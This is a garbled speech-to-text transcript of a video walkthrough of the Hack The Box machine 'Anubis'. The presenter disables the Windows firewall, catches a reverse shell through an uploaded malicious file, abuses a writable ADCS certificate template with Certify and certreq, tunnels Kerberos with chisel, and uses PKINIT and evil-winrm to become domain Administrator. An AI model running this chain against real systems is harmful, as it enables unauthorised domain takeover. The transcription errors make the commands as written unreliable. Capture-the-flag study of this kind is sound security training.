this is here so reg add we just do this but we have to wait for this to finish that could take a while so I'm just going to get a second shell okay I'm on starting the service there we go so we add this key and I think that sets remote desktop on honestly so SS or not SS NC z v 10 10 11 102 3389 and it's not coming back so remote desktop is not enabled yet we may have to restart a service or net sh ADV firewall set all profile State off that's just completely disable that firewall and see I wonder let's restart Remote Desktop Service CMD how to restart RDS without rebooting this sounds good services see task manager term service I wonder if we can just do this Powershell to run this make sure I have the right port I'm pretty sure I do 3389 yep see sudo proxy chains do we have to go through the proxy to hit this um this would be what was that cat Etsy house 127 this huh that worked I wonder why I can't get it on the other one see does any point work c390 nope so this is how I'm gonna do it we'll do let's see our desktop that see do we get a prompt for anything uh pseudo proxy chains or desktop except the certificate and credit SSP is required Wonder X free RDP V colon slash U H who am I Diego Cruz slash P secret one two three yes and it's still oh status login failure I'm guessing I don't have the login rights for remote desktop um let's see that local group administrators Diego Cruz slash ad see failure to log into server well this game annoying oh secret one two three was um the password for local admin net user Diego Cruz secret123 change his password I thought that would have done it oh wait that's in the wrong prompt let's do it from an administrator net user Diego Cruz secret one two three and with enough failure we eventually get in so let's go into MMC so CMD MMC uh Diego Cruz secret one two three okay I did control M so I lived in MMC for a long time so I do control m and then alt a to add things so I do it really quick control M type certificate uh we can add templates we don't need that one we just want uh the certificate snap in I'm doing current user because that's the one we went into if I go to personal certificates administrator so we can see this is the smart card certificate a smart code login we see right here for administrator and this is why we can abuse this with rubius to log in as admin even though we're Diego Cruz because we have this certificate if I go into details let's see uh is it like a common name so web this is the template Authority swear administrator somewhere here come on web smart code login crl that's revocation list Authority information access is this it key usage oh the subject alternative name principal name administrator so that is how we do it the easy way through automated tools now I'm going to revert the Box because we just did a bunch of things to make this work with automated tools and we're going to do it manually which is probably going to be painful so let me clear a bunch of this we can exit this actually don't have to worry about cleaning up because um reverting so let's just clear the screen there we go the first step is just getting our access back and all we have to do is upload this what if dot omv file so you can do SMB client Dash capital u local admin and then 10 10 11 102 and I believe the directory was shared that's secret one two three for the password and then we just go into documents Analytics you can put what if Dot omv and then we also have to listen so nclvnp 9001 let's remember to use RL wrap so we have access to all those keys and I'm just going to clear the screen so we have a fresh web server up so we can see whenever something makes a request it runs every five minutes so it can take a little bit for you to get the result I'm going to see if I can do anything to force it along see give it a few seconds come on and there we go we have it hitting slash point and then it's going to execute a Powershell as long as we left everything in a good state may take a few seconds to do that but for some reason doesn't look like it is let's see what is sploit.js look like oh there we go just takes a little bit and we have that reverse shell everything I'm going to be showing you is pretty much based upon this blog post of impersonate Windows admin Linux I think if we do this let's go to Google let's see this the El comment WordPress pairs from 2020. so everything's gonna be based upon this but I'm going to just kind of Step through it kind of show you exactly what is happening here and the very first thing I want to do is re-upload certify because this is a great way to find the vulnerable certificate and exactly what's happening so let's go back into program data data and then curl 10 10 14 8. certify.exe out into certify so once we have this we can certify EXE I think it's just find and this will find vulnerabilities or certificates and the one we want I believe is on the bottom so I'm going to run that and also I want to get to this role because I want to show exactly what these commands do so that command finished in 15 seconds we see and we can see this template name web has only server authentication now these pieces that we're about to add these EKU is going to be one for Peak I extended and the other for this certificate certificate application policy so I'm going to set both of these to allow smart cards so this is what the vulnerability is because we have full right access to this the web developers Group which we're a member of we have full control so that's where this vulnerability comes from uh that was not the clip what I wanted okay so let's recopy this paste there we go and then I can also do EK use to make sure that is actually set and it's kind of important because we're not using netcat we're doing this weird Powershell reverse shell where we don't see any error messages so I'm just going to purposely forget to change one thing we run this and we may think we're good it takes a little bit of time it'll come back but we're not modifying um this piece of the ldap query so it won't know their domain and it never actually sets it so if I run certify again and we go to this certificate within probably 10 more seconds we're going to see no change but I just wanted to show you that when you do these Powershell reverse shells and you're not catching standard area it can be super easy to just miss when a command fails because it's not giving you that output so we see um we are web and server Authentication so let's fix this command up to add the correct things so this is going to be wind Corp I don't know if casing matters I don't think it does but just do that doesn't take any time at all and now I'm going to run certify again and we're going to see hopefully that smartcard login is enabled for those authentication methods there's one other one that's enabled and I forget exactly what that is but time won't tell probably about five more seconds there we go and here it is so the web now the base template to this is allowing the certificate for client authentication and smart card login so this is where the actual vulnerability comes from it's not really a vulnerability for us to be able to do server authentication because it's not like a privileged login I guess but it is for smart cards because now we can impersonate users so we go back to the blog post and this part is done on Linux and this is just a simple bash script um we'll go over exactly what this does once I copy it it's kind of a weird way they go about it and these spaces are a bit of a pain but oh well uh Beggars can't be choosers right so let's go Dev shm let's see do I have stuff here I probably don't really let's just do generate.sh paste this in and I hate all these like beginning spaces so I'm going to do colon percent s and I'm going to do a reg X carrot so begin of line for space and match any amount of spaces and replace it with nothing and there we go we just removed all those beginning line things so I just saved it and went back so it cleared that little search thing so it's doing a cat and then when you do it this way it's cattying to this file and then it's going to go until it sees eof so we're writing to confile which is admin.cnf uh we have to change the DN so this is going to be oh God I hit some keys and them did weird things but nothing changed so hdb wind Corp okay that looks fine CN we want it to be administrator and then we also want this to be windcorp.hdb so we want to match that and we'll just run generate.sh again it creates admin.cnf with that um cat and we can just verify everything looks fine and we got to get the request over to the DC to be signed so I'm going to CP admin.req to hdb um Anubis dub dub dub we can go back to a reverse cell do curl 10 10 14 8. admin dot request o admin dot request so now we saved it here and we can use an application called cert Rec that's already on the DC to sign it we need to know the CE uh the certificate Authority name we can probably use cert util for that because it's going to be this the config so this is what we want I'm going to do certrequest.exe submit config put this attribute we want to add it to the certificate template of web and we want admin.request that's the file we put on the box and then we'll generate admin dot certificate or CER now it's really important that this file does not exist when you run the command if the file does exist this command is going to hang and a prompt is going to open up on the box it's a weird Behavior but um it should probably take about 15-20 seconds to finish hopefully the file did not exist and I didn't just hang the Box but time will tell we'll give it another uh a few seconds there we go and then we want to get this certificate back to us so I'm going to type admin dot sir and this is the signed request or signed certificate that we gave so now we have the private key which is going to be admin Dot key and then we also have admin.certificate that shows the DC has signed this so the next step is to configure Kerberos and it this article doesn't do a great job on showing like the configuration you need you do need to install these two packages which I already have so make sure you install kb5 user and PK a net but it goes through all the configurations and multiple posts um this is my configuration file I didn't feel like redoing it so V Etsy krb5.com and we can see so default realm wincorp.hdb we specify the KDC the admin server and then this PK and it anchors is from the article and I gotta put the um care B the certificates where this is or we could just change everything to Dev shm so we can huh we'll just put them in opt caribbe so let's do maketer opt krb and then we want to copy admin dot key and admin dot certificate to opt KOB make sure these are the right keys yeah key and C or the next thing we need is the certificate Authority and we can get that from the DC with the command cert util and we want to do ca.cert and then we'll output it to ca.cer so this should output the certificate Authority certificate of this domain controller may take a few seconds hopefully it doesn't take too long because that means I did something wrong and we'll have to figure that out uh there we go uh let's see type c a DOT c-e-r oh that's not what I want um I'm gonna grab this form of it the base 64. I think this is exactly what I want I wonder if there was a different certificate that got created we'll try this so I want to go into opt care B ca.cer paste this and now uh we should be able to do a knit but before we do that um I just realized kubrows is not listening yet if we looked at our nmap CD what is that just go to this pane like that there we go so CD and map if I look at Anubis allports.nmap we don't have Kerberos listening so we have to set up a port forward so what I'm going to do is we're going to run chisel and this time when I run chisel I have to do it with sudo because I want to listen on privilege ports I guess we could probably do everything through proxy chains but um I'm not a fan of doing things through proxy chains if I don't have to I think that's in www so sudo chisel dot slash like this server and then we want to do Sox five because I still want to set that and also allow reverse uh it's already in use we need a specified port 8000. okay on this end uh we have to download chisel so 10 10 14 8. I think it's a Capital C on my server chisel.exe uh 404 it was probably a lowercase C 200 I was just looking over here so with chisel downloaded we will set up two Port forwards on this client one forwarding Port 88 which is Kerberos the other just doing a socks in case we want to do any port we want and while that downloads I'm going to go into my host file so V Etsy hosts uh sure we can edit anyways I'm going to edit these lines out and then I'm going to change this to be 127001 so now when Kerberos looks for wincorp.hdb or earth.win corp.hdb it's going to look for localhost which then chisel is going to forward out to um this box so if I look at SS lntp grep 88 we see this weird Port listening that's not Port 88 that's 1883 but chisel.exe client we can do the socks which you're familiar with and then our colon 88 127001 88. and if you did not um run chisel with sudo here you won't see this next line appear of oh did I screw something up our colon sucks thought that was right oh wait I never specified the IP 10 10 14 8 8 000. let's see it's connecting you won't see this session one because what's going to happen is the client's going to error up here and say um cannot bind on Port 88 which is an error message from the server because you didn't run with sudo so it didn't have permission to listen on 88. it's a weird thing but again we're not seeing error messages here so you wouldn't see it um but we have that if I do SS we see Port 88 is now listening so if I did a k a net on local admin we can just test this out and I'm going to put secret one two three I do a k list and we have authenticated against Kerberos so let's do a k destroy so now my K list is empty and we're going to do knit Dash X 509 user identity is equal to file and we'll do admin dot CER and admin dot key administrator at windcorp.hdb and it's asking me for a password now you may think like candet has a dash V flag for reverse um I think it has a verbose flag but it doesn't really output that much more information the best way to get debug information is to set an environment variable or before knit do care B5 Trace is equal to Dev STD out and now you get a bunch of information and what we see here is failed to verify own certificate depth 0 certificate is not yet valid so the certificate we have isn't valid yet so our candidate is dropping it now if we went all the way back to our nmap let's do CD dot dot uh nmap less Anubis we can see there's a drift of one hour so the time on this box is one hour ahead of my box or hour in like six minutes we could confirm that if I had this shell back we could run time but let's just assume that that is correct and the time is one hour off I'm gonna run date and we're gonna do pseudo date dash s I'm going to do 08 08 uh we'll do 50 seconds P.M actually we want one hour ahead so 908 and we see the time has now changed let's try this again it's sending a TCP request come on it may take a little bit of time and there we go so we don't have an error message it just says storing administrator and file so if I do k-list now we have the certificate I'm going to destroy it real quick we're going to do it without this Trace because I just want to show this doesn't actually produce any output so if you ever want to troubleshoot knit make sure you do that care B5 Trace so now we have a certificate we are the administrator so this is very much like after doing git Dash smartcode certificate we have it now we should be able to use it with winrm so I'm going to do proxy chains uh let's see I thought it was evil when RM say evil win or M there we go does it have like a certificate thing let's see I'm just going to do Dash R for Realm so just enjoy Dash I 127001 we're going to proxy chains it and then Dash U administrator Dash R for Realm windcorp.hdb and let's see if it actually authenticates us uh we have an error message server not found in Kerberos database let's see instead of a IP let's do earth.windcorp.hdb there we go uh curb roast itself does not like IP addresses it very much likes host names when you can supply them so hoping that this is good and there we go we are now administrator from Linux so hope you guys enjoyed this second way to do the box and that will be it for the video take care and I will see you all next week